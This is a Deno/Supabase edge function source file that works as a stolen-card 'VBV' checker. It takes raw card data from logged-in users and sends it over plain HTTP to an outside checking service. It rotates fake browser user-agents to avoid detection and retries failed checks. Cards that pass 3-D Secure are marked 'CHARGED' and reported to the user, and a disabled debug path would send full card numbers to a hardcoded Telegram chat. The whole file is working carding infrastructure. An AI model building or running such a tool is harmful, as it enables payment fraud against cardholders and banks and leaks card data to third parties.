import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// HTML escape utility for Telegram
const escapeHtml = (text: string): string => {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
};

// Send admin debug notification with raw API response
const sendAdminDebug = async (cc: string, rawResponse: string, computedStatus: string, apiMessage: string): Promise<void> => {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('[VBV-AUTH] No Telegram bot token - skipping admin debug');
    return;
  }

  try {
    const statusEmoji = computedStatus === 'passed' ? '✅' : computedStatus === 'rejected' ? '❌' : '⚠️';
    
    const message = `🔍 <b>VBV AUTH DEBUG</b>\n\n` +
      `${statusEmoji} <b>Status:</b> ${escapeHtml(computedStatus.toUpperCase())}\n` +
      `💳 <b>Card:</b> <code>${escapeHtml(cc)}</code>\n\n` +
      `📋 <b>Result:</b>\n<code>${escapeHtml(apiMessage)}</code>\n\n` +
      `📦 <b>Raw Response:</b>\n<pre>${escapeHtml(rawResponse.substring(0, 3000))}</pre>`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    console.log('[VBV-AUTH] Admin debug sent');
  } catch (error) {
    console.error('[VBV-AUTH] Failed to send admin debug:', error);
  }
};

// Send user notification for passed cards via notify-charged-card function
const sendUserNotification = async (userId: string, cc: string, threeDStatus: string): Promise<void> => {
  if (!SUPABASE_SERVICE_ROLE_KEY) {
    console.log('[VBV-AUTH] No service role key - skipping user notification');
    return;
  }

  try {
    const notifyUrl = `${SUPABASE_URL}/functions/v1/notify-charged-card`;
    
    const payload = {
      user_id: userId,
      card_details: cc,
      status: "CHARGED", // Use CHARGED status for notification system
      response_message: `VBV PASSED: ${threeDStatus}`,
      amount: "$0 VBV AUTH",
      gateway: "Yunchi VBV Auth",
    };

    console.log('[VBV-AUTH] Sending user notification:', payload);

    const response = await fetch(notifyUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('[VBV-AUTH] User notification sent successfully');
    } else {
      const errorText = await response.text();
      console.error('[VBV-AUTH] User notification failed:', errorText);
    }
  } catch (error) {
    console.error('[VBV-AUTH] Error sending user notification:', error);
  }
};
const PASSED_KEYWORDS = ['authenticate_successful', 'success', 'successful', 'passed'];

// Determine status from VBV API response
const getStatusFromResponse = (data: Record<string, unknown>): { status: "passed" | "rejected", threeDStatus: string } => {
  try {
    // Check for error responses first
    if (data?.error) {
      const errorStatus = String(data.error);
      console.log('[VBV-AUTH] API error response:', errorStatus);
      return { status: "rejected", threeDStatus: errorStatus };
    }

    // PRIORITY: Check paymentMethod.threeDSecureInfo FIRST - this has the actual status
    let threeDSecureInfo: Record<string, unknown> | undefined;
    let extractedStatus: string | undefined;
    
    // Try paymentMethod.threeDSecureInfo.status first
    if (data?.paymentMethod) {
      const paymentMethod = data.paymentMethod as Record<string, unknown>;
      console.log('[VBV-AUTH] paymentMethod exists');
      if (paymentMethod?.threeDSecureInfo) {
        const pmThreeDSecure = paymentMethod.threeDSecureInfo as Record<string, unknown>;
        console.log('[VBV-AUTH] paymentMethod.threeDSecureInfo exists, status:', pmThreeDSecure?.status);
        if (pmThreeDSecure?.status) {
          extractedStatus = String(pmThreeDSecure.status);
          threeDSecureInfo = pmThreeDSecure;
          console.log('[VBV-AUTH] Using paymentMethod.threeDSecureInfo.status:', extractedStatus);
        }
      }
    }
    
    // Fallback to root level threeDSecureInfo.status
    if (!extractedStatus && data?.threeDSecureInfo) {
      const rootInfo = data.threeDSecureInfo as Record<string, unknown>;
      console.log('[VBV-AUTH] Checking root threeDSecureInfo, status:', rootInfo?.status);
      if (rootInfo?.status) {
        extractedStatus = String(rootInfo.status);
        threeDSecureInfo = rootInfo;
        console.log('[VBV-AUTH] Using root threeDSecureInfo.status:', extractedStatus);
      }
    }
    
    if (!extractedStatus) {
      console.log('[VBV-AUTH] No status found in any threeDSecureInfo');
      // Check if there's a message field
      if (data?.message) {
        const msgStatus = String(data.message);
        const msgLower = msgStatus.toLowerCase();
        const isPassed = PASSED_KEYWORDS.some(keyword => msgLower.includes(keyword));
        return { status: isPassed ? "passed" : "rejected", threeDStatus: msgStatus };
      }
      return { status: "rejected", threeDStatus: "no_status" };
    }

    // Use the extracted status value
    const threeDStatus = extractedStatus;
    const statusLower = threeDStatus.toLowerCase();

    console.log('[VBV-AUTH] Final extracted status:', threeDStatus);

    // PASSED: Status contains any of the passed keywords
    const isPassed = PASSED_KEYWORDS.some(keyword => statusLower.includes(keyword));
    
    if (isPassed) {
      console.log('[VBV-AUTH] Card PASSED - status:', threeDStatus);
      return { status: "passed", threeDStatus };
    }

    // REJECTED: Any other status value
    console.log('[VBV-AUTH] Card REJECTED - status:', threeDStatus);
    return { status: "rejected", threeDStatus };
  } catch (error) {
    console.error('[VBV-AUTH] Error parsing response:', error);
    return { status: "rejected", threeDStatus: "parse_error" };
  }
};

// Perform API check with retry logic
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  const apiUrl = `http://vbv-production.up.railway.app/api?cc=${encodeURIComponent(cc)}`;
  
  console.log(`[VBV-AUTH] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 50000);

    const response = await fetch(apiUrl, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[VBV-AUTH] Attempt ${attempt} - Raw API response:`, rawText.substring(0, 500));

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      console.log('[VBV-AUTH] Failed to parse JSON response');
      data = { raw: rawText, error: "Invalid JSON response" };
    }

    console.log(`[VBV-AUTH] Attempt ${attempt} - Parsed response:`, JSON.stringify(data).substring(0, 500));

    const { status: computedStatus, threeDStatus } = getStatusFromResponse(data);
    
    // Build API message - show exact status in quotes as requested
    // Format: status: "<message>"
    const apiMessage = `status: "${threeDStatus}"`;

    // Include raw response for admin debug

    // Include raw response for admin debug
    const rawResponse = JSON.stringify(data, null, 2);

    return {
      computedStatus,
      apiStatus: computedStatus.toUpperCase(),
      apiMessage,
      threeDStatus,
      threeDSecureInfo: (data?.threeDSecureInfo as Record<string, unknown>) || null,
      rawResponse
    };
  } catch (error) {
    console.error(`[VBV-AUTH] Attempt ${attempt} - Fetch error:`, error);
    
    if (attempt < maxRetries) {
      console.log(`[VBV-AUTH] Retrying after fetch error...`);
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }
    
    const errorMessage = error instanceof Error ? error.message : "Unknown fetch error";
    const isTimeout = errorMessage.includes('abort') || errorMessage.includes('timeout');
    
    return { 
      apiStatus: "ERROR",
      apiMessage: isTimeout ? "API timeout (50s)" : errorMessage,
      computedStatus: "unknown",
      threeDStatus: "error"
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ 
          error: 'Card data (cc) is required', 
          computedStatus: 'unknown',
          apiStatus: 'ERROR',
          apiMessage: 'Card data (cc) is required'
        }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[VBV-AUTH] Checking card for user:', user.id);
    console.log('[VBV-AUTH] Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    // Admin debug notifications disabled

    // Send user notification for PASSED cards (fire-and-forget)
    if (data.computedStatus === 'passed') {
      sendUserNotification(
        user.id,
        cc,
        data.threeDStatus as string || 'passed'
      ).catch(err => console.error('[VBV-AUTH] User notification error:', err));
    }

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[VBV-AUTH] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ 
        error: errorMessage, 
        status: "ERROR",
        computedStatus: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
